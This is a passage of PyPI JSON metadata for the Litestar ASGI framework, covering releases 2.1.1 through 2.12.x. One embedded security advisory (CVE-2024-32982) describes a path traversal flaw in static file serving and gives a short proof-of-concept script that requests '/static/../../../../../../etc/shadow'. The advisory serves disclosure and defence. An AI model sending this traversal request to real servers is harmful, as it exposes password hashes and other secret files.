Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.1.1/","requires_dist":["advanced-alchemy (==0.2.0) ; extra == \"sqlalchemy\" or extra == \"full\"","alembic","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","minijinja (>=1.0.0) ; extra == \"minijinja\" or extra == \"full\"","msgspec (>=0.18.2)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12)","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.1.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"247a2904ff325542cfed7be68b3f0bae747ccb277637342f66372e46806d48d5","md5":"ff2ce8cc0eb007f8d7cce65b1d568693","sha256":"b8575a868d0dbe021b665a6c66d9e1feb65fcb94c8a386dad2b2895ce8f30896"},"downloads":-1,"filename":"litestar-2.1.1-py3-none-any.whl","has_sig":false,"md5_digest":"ff2ce8cc0eb007f8d7cce65b1d568693","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":449257,"upload_time":"2023-09-25T17:58:01","upload_time_iso_8601":"2023-09-25T17:58:01.710389Z","url":"https://files.pythonhosted.org/packages/24/7a/2904ff325542cfed7be68b3f0bae747ccb277637342f66372e46806d48d5/litestar-2.1.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e79d21cae84af17fa8be35dbcadb248c7ee64549fda5b695cb46f555945ada63","md5":"0b77077ee225d457b139b9f7ae82d88e","sha256":"33a4134807e9ffb70b856fe1565066c050ebc00df0cb768fc59efa41e8f8b3de"},"downloads":-1,"filename":"litestar-2.1.1.tar.gz","has_sig":false,"md5_digest":"0b77077ee225d457b139b9f7ae82d88e","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":312599,"upload_time":"2023-09-25T17:58:04","upload_time_iso_8601":"2023-09-25T17:58:04.267801Z","url":"https://files.pythonhosted.org/packages/e7/9d/21cae84af17fa8be35dbcadb248c7ee64549fda5b695cb46f555945ada63/litestar-2.1.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.10.0":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":["annotated-types","attrs","brotli","cli","cryptography","full","jinja","jwt","mako","minijinja","opentelemetry","piccolo","picologging","prometheus","pydantic","redis","sqlalchemy","standard","structlog"],"release_url":"https://pypi.org/project/litestar/2.10.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.10.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"f80760c484867438772723caac20e4ac1ff88855c6d3ea8387ac7c84b76b729c","md5":"ec14260a0262f4721a460892c6004acb","sha256":"a4fbdb108bfb41e07b56aee6dbdd70f94328f4d4265ebfde1662aef320224375"},"downloads":-1,"filename":"litestar-2.10.0-py3-none-any.whl","has_sig":false,"md5_digest":"ec14260a0262f4721a460892c6004acb","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":531481,"upload_time":"2024-07-26T18:25:12","upload_time_iso_8601":"2024-07-26T18:25:12.870930Z","url":"https://files.pythonhosted.org/packages/f8/07/60c484867438772723caac20e4ac1ff88855c6d3ea8387ac7c84b76b729c/litestar-2.10.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"00dde34c38ddebd29861d286457113d647342a6928af8f701c18e31c08b97d23","md5":"229637b4ece73e7179d7488ab4b29086","sha256":"c25d5134c6848dfa752494948a644af1fb085143a0bce6d0840fe957b0738432"},"downloads":-1,"filename":"litestar-2.10.0.tar.gz","has_sig":false,"md5_digest":"229637b4ece73e7179d7488ab4b29086","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":700189,"upload_time":"2024-07-26T18:25:15","upload_time_iso_8601":"2024-07-26T18:25:15.444162Z","url":"https://files.pythonhosted.org/packages/00/dd/e34c38ddebd29861d286457113d647342a6928af8f701c18e31c08b97d23/litestar-2.10.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.11.0":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":["annotated-types","attrs","brotli","cli","cryptography","full","jinja","jwt","mako","minijinja","opentelemetry","piccolo","picologging","prometheus","pydantic","redis","sqlalchemy","standard","structlog"],"release_url":"https://pypi.org/project/litestar/2.11.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","pyjwt>=2.9.0; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","pyjwt>=2.9.0; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.11.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"cc92ad6a0368bdb74f92fdc2714cc8e5d72f01895932ee7a19d3201b353f6065","md5":"1e9bff1a484efa5b43b92d925a94c016","sha256":"6d677ccdc00a0b4ce54cff5172531890358a27d6da1a054c8cab6a7e2119823e"},"downloads":-1,"filename":"litestar-2.11.0-py3-none-any.whl","has_sig":false,"md5_digest":"1e9bff1a484efa5b43b92d925a94c016","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":538366,"upload_time":"2024-08-27T17:56:36","upload_time_iso_8601":"2024-08-27T17:56:36.430448Z","url":"https://files.pythonhosted.org/packages/cc/92/ad6a0368bdb74f92fdc2714cc8e5d72f01895932ee7a19d3201b353f6065/litestar-2.11.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"88ae66960b31487a933bd85cf0d37eb570facab3ce5005c4459e966fcfe46ce9","md5":"08fc589f8e665917fcc65861d7e5bbfe","sha256":"6c8cf2b60c352e6b8e08e6a995d2a66ddc26ec53bc2f1df7214d26abcc1d00c2"},"downloads":-1,"filename":"litestar-2.11.0.tar.gz","has_sig":false,"md5_digest":"08fc589f8e665917fcc65861d7e5bbfe","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":710838,"upload_time":"2024-08-27T17:56:38","upload_time_iso_8601":"2024-08-27T17:56:38.621473Z","url":"https://files.pythonhosted.org/packages/88/ae/66960b31487a933bd85cf0d37eb570facab3ce5005c4459e966fcfe46ce9/litestar-2.11.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.12.0":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":["annotated-types","attrs","brotli","cli","cryptography","full","jinja","jwt","mako","minijinja","opentelemetry","piccolo","picologging","prometheus","pydantic","redis","sqlalchemy","standard","structlog"],"release_url":"https://pypi.org/project/litestar/2.12.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","pyjwt>=2.9.0; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","pyjwt>=2.9.0; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.12.0","yanked":true,"yanked_reason":"Broken dependencies. See https://github.com/litestar-org/litestar/issues/3749"},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"8ab20440d5b9122a63628ae5a513ee5233235ec374af34f506983a9ba884b3d7","md5":"584084be266943a2b7a3189c81872301","sha256":"7b8b5ca7d9112df45e1733d2c3af58c9cda46be18cf141176d320d30b1e7a197"},"downloads":-1,"filename":"litestar-2.12.0-py3-none-any.whl","has_sig":false,"md5_digest":"584084be266943a2b7a3189c81872301","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":541975,"upload_time":"2024-09-21T09:18:30","upload_time_iso_8601":"2024-09-21T09:18:30.185601Z","url":"https://files.pythonhosted.org/packages/8a/b2/0440d5b9122a63628ae5a513ee5233235ec374af34f506983a9ba884b3d7/litestar-2.12.0-py3-none-any.whl","yanked":true,"yanked_reason":"Broken dependencies. See https://github.com/litestar-org/litestar/issues/3749"},{"comment_text":"","digests":{"blake2b_256":"acc99836c98c8c2ead7b90a2b87165a8d0f3e7edf7b01312f615d2f1845a14fa","md5":"f0d310409977443c7e9c54a4ce8d0a2f","sha256":"0cae5be3c8b4a7c895209237ce7f0d1cea9f08db23fe0e55d805dbcac0a99591"},"downloads":-1,"filename":"litestar-2.12.0.tar.gz","has_sig":false,"md5_digest":"f0d310409977443c7e9c54a4ce8d0a2f","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":716731,"upload_time":"2024-09-21T09:18:32","upload_time_iso_8601":"2024-09-21T09:18:32.304964Z","url":"https://files.pythonhosted.org/packages/ac/c9/9836c98c8c2ead7b90a2b87165a8d0f3e7edf7b01312f615d2f1845a14fa/litestar-2.12.0.tar.gz","yanked":true,"yanked_reason":"Broken dependencies. See https://github.com/litestar-org/litestar/issues/3749"}],"vulnerabilities":[]},"2.12.1":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: 